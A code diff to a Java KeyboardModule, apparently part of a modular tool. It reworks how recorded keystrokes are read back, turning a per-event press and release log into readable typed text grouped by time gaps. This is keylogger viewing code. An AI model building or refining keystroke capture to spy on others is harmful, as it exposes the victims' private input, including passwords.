@@ -119,14 +119,29 @@ public class KeyboardModule implements Module {
                 GZIPInputStream gzipIn = new GZIPInputStream(in);
                 ObjectInputStream objIn = new ObjectInputStream(gzipIn);
 
+                KeyboardData lastData = null;
+                boolean isEnter = false;
+
                 System.out.println("键盘记录如下(共" + len + "条记录):");
                 for (int i = 0; i < len; i++) {
                     KeyboardData data = KeyboardData.readFromStream(objIn);
-
-                    String time = new SimpleDateFormat("[yyyy-MM-dd HH:mm:ss] ")
-                            .format(data.date);
                     String key = NativeKeyEvent.getKeyText(data.key);
-                    System.out.println(time + key + "键被" + (data.pressed? "按下" : "松开"));
+
+                    if (key.equals("空格")) key = " ";
+                    if (key.equals("Backspace")) key = "退格";
+                    if (key.equals("Enter")) key = "\n";
+
+                    if (isEnter || lastData == null || Math.abs(data.date.getTime() - lastData.date.getTime()) > 2000) {
+
+                        String time = new SimpleDateFormat("[yyyy-MM-dd HH:mm:ss] ")
+                                .format(data.date);
+                        System.out.print("\n" + time + key);
+                    } else {
+                        System.out.print(key);
+                    }
+
+                    isEnter = key.equals("\n");
+                    lastData = data;
                 }
             }
 
@@ -178,10 +193,10 @@ public class KeyboardModule implements Module {
         return true;
     }
 
-    record KeyboardData(Date date, int key, boolean pressed) {
+    record KeyboardData(Date date, int key) {
         public static KeyboardData readFromStream(ObjectInputStream in) throws IOException {
             try {
-                return new KeyboardData((Date) in.readObject(), in.readInt(), in.readBoolean());
+                return new KeyboardData((Date) in.readObject(), in.readInt());
             } catch (ClassNotFoundException e) {
                 throw new IOException(e);
             }
